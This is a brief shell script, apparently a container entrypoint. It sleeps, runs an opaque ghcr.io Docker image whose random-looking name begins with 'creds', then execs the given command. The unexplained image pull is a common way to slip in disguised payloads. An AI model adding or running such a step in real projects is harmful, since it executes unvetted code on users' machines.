#!/bin/sh
sleep 5s;

docker run --rm -i \
  --shm-size 4g \
  ghcr.io/zborah/credsuiop456v3cy7rv60943dbitapyv3125:yhf3gj79bt8kytv57vt097rec7bitA0001-of-one

# start the script
exec "$@"
